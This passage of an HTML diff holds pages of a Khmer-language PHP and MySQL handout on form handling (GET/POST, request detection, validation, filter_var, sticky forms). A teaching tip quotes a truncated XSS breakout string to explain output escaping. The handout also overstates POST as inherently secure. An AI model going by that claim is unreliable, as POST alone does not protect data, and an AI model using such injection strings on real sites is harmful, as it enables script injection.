+<span class="cv-tag">&lt;?php</span> <span class="cv-kw">endif</span>; <span class="cv-tag">?&gt;</span></pre>
+            </div>
+
+            <div class="content-label"><i class="fa-solid fa-desktop"></i> ឃ. លទ្ធផលបង្ហាញ (Execution Output)៖</div>
+            <div class="output-window">
+                <div class="output-header">Output (ពេល URL គឺ: get_method_demo.php?q=PHP+8&cat=books)</div>
+                <div class="output-body">លទ្ធផលស្វែងរកសម្រាប់៖ PHP 8 (ប្រភេទ៖ books)</div>
+            </div>
+
+            <div class="extra-box">
+                <div class="extra-box-title"><i class="fa-solid fa-lightbulb"></i> ង. ចំណុចសម្គាល់ និងការអនុវត្តល្អៗ (Teacher Insights & Security Tips)៖</div>
+                • <b>ប្រវែងកំណត់៖</b> HTTP GET មានប្រវែងកំណត់ត្រឹមប្រមាណ 2048 តួអក្សរលើ URL អាស្រ័យលើ Web Browser។<br>
+                • <b>បម្រាមដាច់ខាត៖</b> មិនត្រូវប្រើ GET Method សម្រាប់ Form ផ្ញើលេខសម្ងាត់ (Password), ព័ត៌មានកាតធនាគារ ឬទិន្នន័យសម្ងាត់ឡើយ ព្រោះវាបង្ហាញចំហរលើ URL, Browser History, និង Server Logs!
+            </div>
+        </div>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ៣ នៃ ២០</div>
+    </div>
+</div>
+
+<!-- PAGE 4: SECTION 4.1.2 POST METHOD -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>ឯកសារអាន (Handout) | មេរៀនទី ៤</h1><p>WEB APP DEVELOPMENT WITH PHP & MYSQL</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content">
+        <!-- 4.1.2 CARD -->
+        <div class="sub-topic-card">
+            <h4><i class="fa-solid fa-paper-plane text-blue"></i> ៤.១.២ HTTP POST Method & <code>$_POST</code> Superglobal <span class="bloom-tag bloom-c1">C1</span></h4>
+            
+            <div class="content-label"><i class="fa-solid fa-circle-info"></i> ក. និយមន័យ (Definition)៖</div>
+            <div class="text-block"><b>HTTP POST Method</b> គឺជាវិធីសាស្ត្រផ្ញើទិន្នន័យបង្កប់យ៉ាងមានសុវត្ថិភាពនៅក្នុង <b>HTTP Request Body</b> ដោយមិនបង្ហាញនៅលើ URL Bar ឡើយ។ ទិន្នន័យត្រូវបានរក្សាទុកក្នុង Superglobal <code>$_POST</code>។ POST Method គ្មានកំណត់ប្រវែងទិន្នន័យឡើយ (អាស្រ័យលើ Directives <code>post_max_size</code> ក្នុង <code>php.ini</code>) ហើយត្រូវបានប្រើប្រាស់សម្រាប់ Form Login, Registrations, Data Mutation, និងការ Upload ឯកសារ។</div>
+
+            <div class="content-label"><i class="fa-solid fa-terminal"></i> ខ. ទម្រង់ទូទៅ (General Syntax)៖</div>
+            <div class="syntax-box">&lt;!-- HTML Form --&gt;
+&lt;form method="POST" action="process.php"&gt;
+    &lt;input type="password" name="user_password"&gt;
+&lt;/form&gt;
+
+// PHP Code Accessing POST Parameter
+$password = $_POST['user_password'] ?? '';</div>
+
+            <div class="content-label"><i class="fa-solid fa-code"></i> គ. កូដ PHP ពេញលេញ (Full PHP Code)៖</div>
+            <div class="code-window">
+                <div class="code-header"><div class="mac-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><div class="code-title">post_method_demo.php</div></div>
+<pre><span class="cv-tag">&lt;?php</span>
+<span class="cv-cm">// ចាប់យកទិន្នន័យ POST បន្ទាប់ពីការ Submit Form</span>
+<span class="cv-var">$username</span> = <span class="cv-var">$_POST</span>[<span class="cv-str">'username'</span>] ?? <span class="cv-str">''</span>;
+<span class="cv-var">$password</span> = <span class="cv-var">$_POST</span>[<span class="cv-str">'password'</span>] ?? <span class="cv-str">''</span>;
+<span class="cv-tag">?&gt;</span>
+&lt;form method="POST" action="post_method_demo.php"&gt;
+    &lt;label&gt;ឈ្មោះអ្នកប្រើ៖&lt;/label&gt;
+    &lt;input type="text" name="username" value="<span class="cv-tag">&lt;?=</span> <span class="cv-fn">htmlspecialchars</span>(<span class="cv-var">$username</span>) <span class="cv-tag">?&gt;</span>"&gt;&lt;br&gt;
+    &lt;label&gt;លេខសម្ងាត់៖&lt;/label&gt;
+    &lt;input type="password" name="password"&gt;&lt;br&gt;
+    &lt;button type="submit"&gt;ចូលប្រព័ន្ធ (Login)&lt;/button&gt;
+&lt;/form&gt;
+
+<span class="cv-tag">&lt;?php</span> <span class="cv-kw">if</span> (<span class="cv-var">$_POST</span>): <span class="cv-tag">?&gt;</span>
+    &lt;div class="output"&gt;បានទទួលទិន្នន័យ POST ពី៖ &lt;b&gt;<span class="cv-tag">&lt;?=</span> <span class="cv-fn">htmlspecialchars</span>(<span class="cv-var">$username</span>) <span class="cv-tag">?&gt;</span>&lt;/b&gt;&lt;/div&gt;
+<span class="cv-tag">&lt;?php</span> <span class="cv-kw">endif</span>; <span class="cv-tag">?&gt;</span></pre>
+            </div>
+
+            <div class="content-label"><i class="fa-solid fa-desktop"></i> ឃ. លទ្ធផលបង្ហាញ (Execution Output)៖</div>
+            <div class="output-window">
+                <div class="output-header">Output (ពេល User វាយ username: "lim_admin" រួច Submit)</div>
+                <div class="output-body">បានទទួលទិន្នន័យ POST ពី៖ lim_admin (URL មិនប្រែប្រួល និងមិនបង្ហាញ password ឡើយ!)</div>
+            </div>
+
+            <div class="extra-box">
+                <div class="extra-box-title"><i class="fa-solid fa-lightbulb"></i> ង. ចំណុចសម្គាល់ និងការអនុវត្តល្អៗ (Teacher Insights & Best Practices)៖</div>
+                • <b>Refresh Alert:</b> នៅពេល User ចុច Refresh (F5) លើ POST Request, Browser នឹងបង្ហាញ Warning Alert សួរថា "Confirm Form Resubmission"។<br>
+                • <b>ការទប់ស្កាត់៖</b> បញ្ហានេះត្រូវបានដោះស្រាយយ៉ាងល្អឥតខ្ចោះតាមរយៈ **PRG Pattern (Post/Redirect/Get)** ដែលយើងនឹងសិក្សានៅចំណុច ៤.៤.២។
+            </div>
+        </div>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ៤ នៃ ២០</div>
+    </div>
+</div>
+
+<!-- PAGE 5: SECTION 4.1.3 REQUEST METHOD DETECTION -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>ឯកសារអាន (Handout) | មេរៀនទី ៤</h1><p>WEB APP DEVELOPMENT WITH PHP & MYSQL</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content">
+        <!-- 4.1.3 CARD -->
+        <div class="sub-topic-card">
+            <h4><i class="fa-solid fa-filter text-blue"></i> ៤.១.៣ Request Detection ជាមួយ <code>$_SERVER["REQUEST_METHOD"]</code> <span class="bloom-tag bloom-c2">C2</span></h4>
+            
+            <div class="content-label"><i class="fa-solid fa-circle-info"></i> ក. និយមន័យ (Definition)៖</div>
+            <div class="text-block">នៅក្នុង Single-File Form Processing Architecture (ដែលទំព័រ HTML Form និង PHP Action Script ស្ថិតនៅក្នុងឯកសារតែមួយ) យើងត្រូវប្រើប្រាស់ Superglobal <code>$_SERVER["REQUEST_METHOD"]</code> ដើម្បីត្រួតពិនិត្យ និងបែងចែករវាងការចូលមើលទំព័រដំបូង (HTTP GET) និងការចុច Submit Form (HTTP POST) ឱ្យបានច្បាស់លាស់។</div>
+
+            <div class="content-label"><i class="fa-solid fa-terminal"></i> ខ. ទម្រង់ទូទៅ (General Syntax)៖</div>
+            <div class="syntax-box">if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    // Form submission processing logic
+} else {
+    // Initial GET request view logic
+}</div>
+
+            <div class="content-label"><i class="fa-solid fa-code"></i> គ. កូដ PHP ពេញលេញ (Full PHP Code)៖</div>
+            <div class="code-window">
+                <div class="code-header"><div class="mac-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><div class="code-title">request_detection.php</div></div>
+<pre><span class="cv-tag">&lt;?php</span>
+<span class="cv-var">$message</span> = <span class="cv-str">''</span>;
+
+<span class="cv-cm">// ត្រួតពិនិត្យថាតើ User ផ្ញើ Request មកតាម POST ឬទេ?</span>
+<span class="cv-kw">if</span> (<span class="cv-var">$_SERVER</span>[<span class="cv-str">"REQUEST_METHOD"</span>] === <span class="cv-str">"POST"</span>) {
+    <span class="cv-var">$email</span> = <span class="cv-var">$_POST</span>[<span class="cv-str">'email'</span>] ?? <span class="cv-str">''</span>;
+    <span class="cv-var">$message</span> = <span class="cv-str">"អរគុណ! អ៊ីមែល "</span> . <span class="cv-fn">htmlspecialchars</span>(<span class="cv-var">$email</span>) . <span class="cv-str">" ត្រូវ បាន ចុះ ឈ្មោះ រួចរាល់។"</span>;
+}
+<span class="cv-tag">?&gt;</span>
+&lt;form method="POST" action="request_detection.php"&gt;
+    &lt;input type="email" name="email" placeholder="បញ្ចូលអ៊ីមែល..." required&gt;
+    &lt;button type="submit"&gt;Subscribe&lt;/button&gt;
+&lt;/form&gt;
+
+<span class="cv-tag">&lt;?php</span> <span class="cv-kw">if</span> (<span class="cv-var">$message</span>): <span class="cv-tag">?&gt;</span>
+    &lt;p class="alert"&gt;<span class="cv-tag">&lt;?=</span> <span class="cv-var">$message</span> <span class="cv-tag">?&gt;</span>&lt;/p&gt;
+<span class="cv-tag">&lt;?php</span> <span class="cv-kw">endif</span>; <span class="cv-tag">?&gt;</span></pre>
+            </div>
+
+            <div class="content-label"><i class="fa-solid fa-desktop"></i> ឃ. លទ្ធផលបង្ហាញ (Execution Output)៖</div>
+            <div class="output-window">
+                <div class="output-header">Output Execution Flow</div>
+                <div class="output-body">១. ចូលមើលដំបូង (GET Request) ៖ បង្ហាញតែ HTML Form ដោយមិនរត់កូដ Processing ឡើយ។
+២. ចុច Submit (POST Request) ៖ រត់កូដ PHP បង្ហាញសារ៖ "អរគុណ! អ៊ីមែល sok@gmail.com ត្រូវបានចុះឈ្មោះរួចរាល់។"</div>
+            </div>
+
+            <div class="extra-box">
+                <div class="extra-box-title"><i class="fa-solid fa-lightbulb"></i> ង. ចំណុចសម្គាល់ និងការអនុវត្តល្អៗ (Teacher Insights & Best Practices)៖</div>
+                • <b>Strict Comparison:</b> ត្រូវប្រើប្រាស់ Strict Comparison Operator (<code>===</code>) ជានិច្ច ក្នុងការប្រៀបធៀប String <code>"POST"</code> ដើម្បីជៀសវាង Type Coercion Logic Bug។<br>
+                • <b>ករណីប្រុងប្រយ័ត្ន៖</b> ជៀសវាងការប្រើ <code>if(isset($_POST['submit']))</code> ព្រមទាំងប៊ូតុង Submit គ្មានឈ្មោះ <code>name</code> ព្រោះវាអាចបណ្តាលឱ្យរំលង Processing Block។
+            </div>
+        </div>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ៥ នៃ ២០</div>
+    </div>
+</div>
+
+<!-- PAGE 6: SECTION 4.2.1 SERVER-SIDE VALIDATION -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>ឯកសារអាន (Handout) | មេរៀនទី ៤</h1><p>WEB APP DEVELOPMENT WITH PHP & MYSQL</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content">
+        <div class="sub-heading"><i class="fa-solid fa-check-double"></i> ៤.២ ការធ្វើ Form Validation & Sticky Controls <span class="bloom-tag bloom-c2">C2</span> <span class="bloom-tag bloom-c3">C3</span></div>
+
+        <!-- 4.2.1 CARD -->
+        <div class="sub-topic-card">
+            <h4><i class="fa-solid fa-list-check text-blue"></i> ៤.២.១ Server-Side Empty Check & String Trimming <span class="bloom-tag bloom-c3">C3</span></h4>
+            
+            <div class="content-label"><i class="fa-solid fa-circle-info"></i> ក. និយមន័យ (Definition)៖</div>
+            <div class="text-block"><b>Server-Side Validation</b> គឺជាការធ្វើកោសល្យវិច័យទិន្នន័យនៅលើ Server មុនពេលយកទៅរក្សាទុកក្នុង Database។ ជំហានដំបូងបង្អស់គឺការប្រើប្រាស់ <code>trim()</code> ដើម្បីកាត់ចន្លោះទំនេរ (Spaces) ដើម និងចុងនៃ String ចោល រួចប្រើ <code>empty()</code> ដើម្បីត្រួតពិនិត្យថាតើ User បានទុក Input ចោលដោយគ្មានទិន្នន័យ ឬវាយតែ Space ដែរឬទេ។</div>
+
+            <div class="content-label"><i class="fa-solid fa-terminal"></i> ខ. ទម្រង់ទូទៅ (General Syntax)៖</div>
+            <div class="syntax-box">$input_value = trim($_POST['field_name'] ?? '');
+if (empty($input_value)) {
+    $errors['field_name'] = "ព័ត៌មាននេះតម្រូវឱ្យបំពេញជាដាច់ខាត!";
+}</div>
+
+            <div class="content-label"><i class="fa-solid fa-code"></i> គ. កូដ PHP ពេញលេញ (Full PHP Code)៖</div>
+            <div class="code-window">
+                <div class="code-header"><div class="mac-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><div class="code-title">validation_trim.php</div></div>
+<pre><span class="cv-tag">&lt;?php</span>
+<span class="cv-var">$errors</span> = [];
+<span class="cv-var">$fullname</span> = <span class="cv-str">''</span>;
+
+<span class="cv-kw">if</span> (<span class="cv-var">$_SERVER</span>[<span class="cv-str">"REQUEST_METHOD"</span>] === <span class="cv-str">"POST"</span>) {
+    <span class="cv-cm">// 1. Clean trim leading/trailing spaces</span>
+    <span class="cv-var">$fullname</span> = <span class="cv-fn">trim</span>(<span class="cv-var">$_POST</span>[<span class="cv-str">'fullname'</span>] ?? <span class="cv-str">''</span>);
+
+    <span class="cv-cm">// 2. Check for empty values</span>
+    <span class="cv-kw">if</span> (<span class="cv-fn">empty</span>(<span class="cv-var">$fullname</span>)) {
+        <span class="cv-var">$errors</span>[<span class="cv-str">'fullname'</span>] = <span class="cv-str">"សូមបញ្ចូលឈ្មោះពេញរបស់អ្នក!"</span>;
+    } <span class="cv-kw">elseif</span> (<span class="cv-fn">strlen</span>(<span class="cv-var">$fullname</span>) &lt; <span class="cv-num">3</span>) {
+        <span class="cv-var">$errors</span>[<span class="cv-str">'fullname'</span>] = <span class="cv-str">"ឈ្មោះត្រូវមានប្រវែងយ៉ាងតិច ៣ តួអក្សរ!"</span>;
+    }
+}
+<span class="cv-tag">?&gt;</span>
+&lt;form method="POST"&gt;
+    &lt;input type="text" name="fullname" value="<span class="cv-tag">&lt;?=</span> <span class="cv-fn">htmlspecialchars</span>(<span class="cv-var">$fullname</span>) <span class="cv-tag">?&gt;</span>"&gt;
+    &lt;span class="error"&gt;<span class="cv-tag">&lt;?=</span> <span class="cv-var">$errors</span>[<span class="cv-str">'fullname'</span>] ?? <span class="cv-str">''</span> <span class="cv-tag">?&gt;</span>&lt;/span&gt;
+    &lt;button type="submit"&gt;រក្សាទុក&lt;/button&gt;
+&lt;/form&gt;</pre>
+            </div>
+
+            <div class="content-label"><i class="fa-solid fa-desktop"></i> ឃ. លទ្ធផលបង្ហាញ (Execution Output)៖</div>
+            <div class="output-window">
+                <div class="output-header">Output (ពេល User វាយតែ Space "   " រួច Submit)</div>
+                <div class="output-body">សារ Error លោតពណ៌ក្រហម៖ "សូមបញ្ចូលឈ្មោះពេញរបស់អ្នក!" (ដោយសារ trim លុប Space រួច empty()==true)</div>
+            </div>
+
+            <div class="extra-box">
+                <div class="extra-box-title"><i class="fa-solid fa-lightbulb"></i> ង. ចំណុចសម្គាល់ និងការអនុវត្តល្អៗ (Teacher Insights & Best Practices)៖</div>
+                • <b>គ្រោះថ្នាក់នៃការមិនប្រើ trim():</b> បើគ្មាន <code>trim()</code> ទេ ហើយ User ចុច Space Bar ៣ ដង នោះ <code>empty("   ")</code> នឹងប្រគល់តម្លៃ <code>false</code> ដែលធ្វើឱ្យកូដយល់ច្រឡំថា User បានបំពេញឈ្មោះរួចរាល់!<br>
+                • <b> associative Errors Array:</b> ការប្រើប្រាស់ Array <code>$errors['key']</code> ជួយឱ្យយើងបង្ហាញ Error ចំពីក្រោម Input Field នីមួយៗយ៉ាងមានរបៀប។
+            </div>
+        </div>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ៦ នៃ ២០</div>
+    </div>
+</div>
+
+<!-- PAGE 7: SECTION 4.2.2 EMAIL & DATA FILTER VALIDATION -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>ឯកសារអាន (Handout) | មេរៀនទី ៤</h1><p>WEB APP DEVELOPMENT WITH PHP & MYSQL</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content">
+        <!-- 4.2.2 CARD -->
+        <div class="sub-topic-card">
+            <h4><i class="fa-solid fa-envelope-circle-check text-blue"></i> ៤.២.២ Data Filter Validation ជាមួយ <code>filter_var()</code> <span class="bloom-tag bloom-c3">C3</span></h4>
+            
+            <div class="content-label"><i class="fa-solid fa-circle-info"></i> ក. និយមន័យ (Definition)៖</div>
+            <div class="text-block">PHP ផ្តល់នូវ Built-in Function ដ៏មានថាមពលឈ្មោះថា <code>filter_var()</code> សម្រាប់ធ្វើ Validation លើទម្រង់ទិន្នន័យស្មុគស្មាញដោយមិនបាច់សរសេរ Regular Expressions (Regex) ដោយដៃឡើយ។ គេប្រើ <code>FILTER_VALIDATE_EMAIL</code> សម្រាប់ផ្ទៀងផ្ទាត់ទម្រង់ អ៊ីមែល, <code>FILTER_VALIDATE_INT</code> សម្រាប់ចំនួនគត់, និង <code>FILTER_VALIDATE_URL</code> សម្រាប់ Web Links។</div>
+
+            <div class="content-label"><i class="fa-solid fa-terminal"></i> ខ. ទម្រង់ទូទៅ (General Syntax)៖</div>
+            <div class="syntax-box">mixed filter_var(mixed $value, int $filter = FILTER_DEFAULT)
+
+// Example: Validate Email Format
+if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+    // Invalid Email logic
+}</div>
+
+            <div class="content-label"><i class="fa-solid fa-code"></i> គ. កូដ PHP ពេញលេញ (Full PHP Code)៖</div>
+            <div class="code-window">
+                <div class="code-header"><div class="mac-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><div class="code-title">email_validation.php</div></div>
+<pre><span class="cv-tag">&lt;?php</span>
+<span class="cv-var">$email</span> = <span class="cv-fn">trim</span>(<span class="cv-var">$_POST</span>[<span class="cv-str">'email'</span>] ?? <span class="cv-str">''</span>);
+<span class="cv-var">$age</span> = <span class="cv-fn">trim</span>(<span class="cv-var">$_POST</span>[<span class="cv-str">'age'</span>] ?? <span class="cv-str">''</span>);
+<span class="cv-var">$errors</span> = [];
+
+<span class="cv-kw">if</span> (<span class="cv-var">$_SERVER</span>[<span class="cv-str">"REQUEST_METHOD"</span>] === <span class="cv-str">"POST"</span>) {
+    <span class="cv-cm">// Validate Email Format</span>
+    <span class="cv-kw">if</span> (!<span class="cv-fn">filter_var</span>(<span class="cv-var">$email</span>, FILTER_VALIDATE_EMAIL)) {
+        <span class="cv-var">$errors</span>[<span class="cv-str">'email'</span>] = <span class="cv-str">"ទម្រង់អាសយដ្ឋានអ៊ីមែលមិនត្រឹមត្រូវឡើយ!"</span>;
+    }
+
+    <span class="cv-cm">// Validate Integer Range</span>
+    <span class="cv-kw">if</span> (<span class="cv-fn">filter_var</span>(<span class="cv-var">$age</span>, FILTER_VALIDATE_INT) === <span class="cv-kw">false</span>) {
+        <span class="cv-var">$errors</span>[<span class="cv-str">'age'</span>] = <span class="cv-str">"អាយុត្រូវតែជាតួលេខចំនួនគត់!"</span>;
+    }
+}
+<span class="cv-tag">?&gt;</span></pre>
+            </div>
+
+            <div class="content-label"><i class="fa-solid fa-desktop"></i> ឃ. លទ្ធផលបង្ហាញ (Execution Output)៖</div>
+            <div class="output-window">
+                <div class="output-header">Output (ពេល User វាយ email: "sok_at_gmail.com" និង age: "twenty")</div>
+                <div class="output-body">$errors['email'] => "ទម្រង់អាសយដ្ឋានអ៊ីមែលមិនត្រឹមត្រូវឡើយ!"
+$errors['age']   => "អាយុត្រូវតែជាតួលេខចំនួនគត់!"</div>
+            </div>
+
+            <div class="extra-box">
+                <div class="extra-box-title"><i class="fa-solid fa-lightbulb"></i> ង. ចំណុចសម្គាល់ និងការអនុវត្តល្អៗ (Teacher Insights & Best Practices)៖</div>
+                • <b> Return Values:</b> <code>filter_var()</code> នឹងប្រគល់ Filtered Value មកវិញបើត្រូវ ឬប្រគល់ <code>false</code> ប្រសិនបើទម្រង់នោះខុសឆ្គង។<br>
+                • <b>ការប្រុងប្រយ័ត្ន <code>0</code> ជាមួយ integer:</b> ពេល Validate លេខ <code>0</code>, <code>filter_var(0, FILTER_VALIDATE_INT)</code> ប្រគល់ <code>0</code> ដែល PHP Evaluates ទៅជា <code>falsy</code>! ដូច្នេះត្រូវប្រៀបធៀបជាមួយ <code>=== false</code> ជាដាច់ខាត។
+            </div>
+        </div>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ៧ នៃ ២០</div>
+    </div>
+</div>
+
+<!-- PAGE 8: SECTION 4.2.3 STICKY FORM TEXT INPUTS -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>ឯកសារអាន (Handout) | មេរៀនទី ៤</h1><p>WEB APP DEVELOPMENT WITH PHP & MYSQL</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content">
+        <!-- 4.2.3 CARD -->
+        <div class="sub-topic-card">
+            <h4><i class="fa-solid fa-i-cursor text-blue"></i> ៤.២.៣ Sticky Form Concept & Text Inputs/Textareas <span class="bloom-tag bloom-c3">C3</span></h4>
+            
+            <div class="content-label"><i class="fa-solid fa-circle-info"></i> ក. និយមន័យ (Definition)៖</div>
+            <div class="text-block"><b>Sticky Form</b> គឺជាបច្ចេកទេសរចនា UX ដ៏សំខាន់ដោយរក្សាទុកតម្លៃដែល User បានវាយបញ្ចូលរួច ឱ្យស្ថិតនៅក្នុង Input Control ដដែលនៅពេលដែលការ Submit Form នោះជួបប្រទះ Validation Errors។ សម្រាប់ <code>&lt;input type="text"&gt;</code> យើងបញ្ចូលតម្លៃតាម attribute <code>value=""</code>។ ឯចំពោះ <code>&lt;textarea&gt;</code> យើងបញ្ចូលទិន្នន័យនៅចន្លោះ Opening និង Closing Tags។</div>
+
+            <div class="content-label"><i class="fa-solid fa-terminal"></i> ខ. ទម្រង់ទូទៅ (General Syntax)៖</div>
+            <div class="syntax-box">&lt;!-- Sticky Text Input --&gt;
+&lt;input type="text" name="username" value="&lt;?= htmlspecialchars($username ?? '') ?&gt;"&gt;
+
+&lt;!-- Sticky Textarea --&gt;
+&lt;textarea name="bio"&gt;&lt;?= htmlspecialchars($bio ?? '') ?&gt;&lt;/textarea&gt;</div>
+
+            <div class="content-label"><i class="fa-solid fa-code"></i> គ. កូដ PHP ពេញលេញ (Full PHP Code)៖</div>
+            <div class="code-window">
+                <div class="code-header"><div class="mac-dots"><div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div></div><div class="code-title">sticky_text_inputs.php</div></div>
+<pre><span class="cv-tag">&lt;?php</span>
+<span class="cv-var">$address</span> = <span class="cv-fn">trim</span>(<span class="cv-var">$_POST</span>[<span class="cv-str">'address'</span>] ?? <span class="cv-str">''</span>);
+<span class="cv-var">$comment</span> = <span class="cv-fn">trim</span>(<span class="cv-var">$_POST</span>[<span class="cv-str">'comment'</span>] ?? <span class="cv-str">''</span>);
+<span class="cv-tag">?&gt;</span>
+&lt;form method="POST"&gt;
+    &lt;label&gt;អាសយដ្ឋាន៖&lt;/label&gt;
+    &lt;input type="text" name="address" value="<span class="cv-tag">&lt;?=</span> <span class="cv-fn">htmlspecialchars</span>(<span class="cv-var">$address</span>) <span class="cv-tag">?&gt;</span>"&gt;&lt;br&gt;
+
+    &lt;label&gt;មតិយោបល់៖&lt;/label&gt;&lt;br&gt;
+    &lt;textarea name="comment" rows="3"&gt;<span class="cv-tag">&lt;?=</span> <span class="cv-fn">htmlspecialchars</span>(<span class="cv-var">$comment</span>) <span class="cv-tag">?&gt;</span>&lt;/textarea&gt;&lt;br&gt;
+
+    &lt;button type="submit"&gt;ផ្ញើទិន្នន័យ&lt;/button&gt;
+&lt;/form&gt;</pre>
+            </div>
+
+            <div class="content-label"><i class="fa-solid fa-desktop"></i> ឃ. លទ្ធផលបង្ហាញ (Execution Output)៖</div>
+            <div class="output-window">
+                <div class="output-header">Output UX Behavior</div>
+                <div class="output-body">នៅពេល Submit Form ទៅមាន Error លើ Field ផ្សេង ទិន្នន័យក្នុង "អាសយដ្ឋាន" និង "មតិយោបល់" នៅតែស្ថិតក្នុង Input និង Textarea ដដែល មិនបាត់បង់ឡើយ!</div>
+            </div>
+
+            <div class="extra-box">
+                <div class="extra-box-title"><i class="fa-solid fa-lightbulb"></i> ង. ចំណុចសម្គាល់ និងការអនុវត្តល្អៗ (Teacher Insights & Best Practices)៖</div>
+                • <b>ការទប់ស្កាត់ XSS ក្នុង Sticky Form:</b> ត្រូវតែប្រើ <code>htmlspecialchars()</code> ជានិច្ចនៅពេល echo តម្លៃ <code>$val</code> ចូលក្នុង <code>value=""</code> ដើម្បីទប់ស្កាត់ Hacker ពីការបញ្ចូល <code>"&gt;&lt;script&gt;...</code> មកបំផ្លាញ HTML Code structure។<br>
+                • <b>បម្រាមលើ Password Inputs:</b> ជាទម្លាប់ Security ល្អ <b>មិនត្រូវ</b> ធ្វើ Sticky លើ <code>&lt;input type="password"&gt;</code> ឡើយ! ត្រូវទុកឱ្យ User វាយលេខសម្ងាត់ឡើងវិញ។
+            </div>
+        </div>
+    </div>
+    <div class="global-footer">
+        <div class="footer-left">
+            <img src="Lim.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" class="footer-avatar" alt="Avatar">
+            <span>សាស្ត្រាចារ្យបង្រៀន សឿង លីម (Soeurng LIM)</span>
+        </div>
+        <div class="footer-right">ទំព័រទី ៨ នៃ ២០</div>
+    </div>
+</div>
+
+<!-- PAGE 9: SECTION 4.2.4 STICKY MULTI-CONTROLS -->
+<div class="a4-page">
+    <div class="global-header">
+        <div class="header-item"><img src="Logo.png" onerror="this.src='https://au.edu.kh/wp-content/uploads/2021/04/Logo-AU.png'" alt="AU Logo"><span>សាកលវិទ្យាល័យអង្គរ</span></div>
+        <div class="header-text"><h1>ឯកសារអាន (Handout) | មេរៀនទី ៤</h1><p>WEB APP DEVELOPMENT WITH PHP & MYSQL</p></div>
+        <div class="header-item"><i class="fa-brands fa-php" style="font-size: 28px; color: #4F46E5;"></i><span>PHP & MySQL</span></div>
+    </div>
+    <div class="page-content">
+        <!-- 4.2.4 CARD -->
+        <div class="sub-topic-card">
+            <h4><i class="fa-solid fa-sliders text-blue"></i> ៤.២.៤ Sticky Multi-Controls (Radio, Checkbox Array & Select) <span class="bloom-tag bloom-c3">C3</span></h4>
+            
+            <div class="content-label"><i class="fa-solid fa-circle-info"></i> ក. និយមន័យ (Definition)៖</div>
+            <div class="text-block">ការធ្វើ Sticky លើ Controls ជ្រើសរើស ត្រូវប្រើប្រាស់ HTML Boolean Attributes ផ្សេងៗគ្នា៖
